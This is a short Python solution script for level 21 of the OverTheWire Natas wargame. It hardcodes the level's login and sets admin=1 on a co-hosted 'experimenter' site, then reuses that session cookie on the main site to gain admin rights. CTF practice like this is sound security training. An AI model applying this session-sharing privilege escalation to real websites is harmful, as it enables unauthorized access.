#!/usr/bin/env python3
import requests

auth = ("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ")
urlA = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug&submit&admin=1'
urlB = 'http://natas21.natas.labs.overthewire.org/?debug'
r = requests.get(urlA, auth=auth)
r = requests.get(urlB, auth=auth, cookies={'PHPSESSID': r.cookies['PHPSESSID']})
print(r.text)
